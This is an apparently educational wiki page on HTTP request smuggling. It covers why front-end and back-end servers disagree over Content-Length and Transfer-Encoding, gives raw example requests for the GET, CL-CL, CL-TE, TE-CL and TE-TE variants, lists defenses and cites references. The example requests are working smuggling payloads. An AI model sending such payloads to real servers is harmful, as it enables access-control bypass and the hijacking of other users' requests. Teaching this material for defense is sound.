HTTP request smuggling
========================================

Introduction
----------------------------------------
HTTP request smuggling is a technique that interferes with the way a website handles the sequence of HTTP requests. It was first proposed in a 2005 article <https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf>`_.

Cause
----------------------------------------
Request smuggling mostly occurs when the front-end server and the back-end server have inconsistent understanding of the data passed in by the client. This is because the HTTP specification provides two different ways to specify where a request ends, the ``Content-Length`` and ``Transfer-Encoding`` headers.

Classification
----------------------------------------
- CLTE: The front-end server uses the ``Content-Length`` header, and the back-end server uses the ``Transfer-Encoding`` header
- TECL: Front-end servers use the ``Transfer-Encoding`` header, and back-end servers use the ``Content-Length`` header.
- TETE: Both front-end and back-end servers support the ``Transfer-Encoding`` header, but one of the servers can be induced not to handle it in some way.

attack
----------------------------------------

GET request with CL not equal to 0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The current-end server allows GET requests to carry the request body, but the back-end server does not allow GET requests to carry the request body. It will directly ignore the ``Content-Length`` header in the GET request without processing it. For example, the following example:

::

    GET / HTTP/1.1\r\n
    Host: example.com\r\n
    Content-Length: 44\r\n

    GET /secret HTTP/1.1\r\n
    Host: example.com\r\n
    \r\n

The front-end server processed ``Content-Length``, but the back-end server did not process ``Content-Length``. Based on the pipeline mechanism, it believed that these were two independent requests, which caused the vulnerability.

CL-CL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
According to RFC 7230, when the request received by the server contains two ``Content-Length`` and the two values ​​​​are different, a 400 error needs to be returned, but some servers do not strictly implement this specification. In this case, the vulnerability will occur when the front-end and backend each take different ``Content-Length`` values. For example:

::

    POST / HTTP/1.1\r\n
    Host: example.com\r\n
    Content-Length: 8\r\n
    Content-Length: 7\r\n

    12345\r\n
    a

In this example, a will be carried into the next request and become ``aGET / HTTP/1.1\r\n``.

CL-TE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CL-TE means that the front-end server processes the request header ``Content-Length``, while the back-end server complies with the provisions of RFC2616, ignores ``Content-Length``, and processes ``Transfer-Encoding``. For example:

::

    POST / HTTP/1.1\r\n
    Host: example.com\r\n
    ...
    Connection: keep-alive\r\n
    Content-Length: 6\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    0\r\n
    \r\n
    a

In this example, a will also be carried into the next request and become ``aGET / HTTP/1.1\r\n``.

TE-CL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TE-CL means that the front-end server processes the ``Transfer-Encoding`` request header, and the back-end server processes the ``Content-Length`` request header. For example:

::

    POST / HTTP/1.1\r\n
    Host: example.com\r\n
    ...
    Content-Length: 4\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    12\r\n
    aPOST / HTTP/1.1\r\n
    \r\n
    0\r\n
    \r\n

TE-TE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
TE-TE means that both front-end and back-end servers process the ``Transfer-Encoding`` request header, but their fault tolerance performance is different. For example, some servers may process ``Transfer-encoding``. For example, the test:

::

    POST / HTTP/1.1\r\n
    Host: example.com\r\n
    ...
    Content-length: 4\r\n
    Transfer-Encoding: chunked\r\n
    Transfer-encoding: cow\r\n
    \r\n
    5c\r\n
    aPOST / HTTP/1.1\r\n
    Content-Type: application/x-www-form-urlencoded\r\n
    Content-Length: 15\r\n
    \r\n
    x=1\r\n
    0\r\n
    \r\n

defense
----------------------------------------
- Disable backend connection reuse
- Make sure all servers in the connection have the same configuration
- Reject ambiguous requests

Reference link
----------------------------------------

RFC
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1 <https://tools.ietf.org/html/rfc2616>`_
- `RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1 <https://tools.ietf.org/html/rfc7230>`_

Blog / Whitepaper
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- `HTTP Request Smuggling by chaiml <https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf>`_
- `HTTP request smuggling by portswigger <https://portswigger.net/web-security/request-smuggling>`_
- `HTTP request smuggling from a question to protocol layer attack <https://xz.aliyun.com/t/6654>`_
- `HTTP Request Smuggling in 2020 <http://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf>`_
- `h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c) <https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c>`_
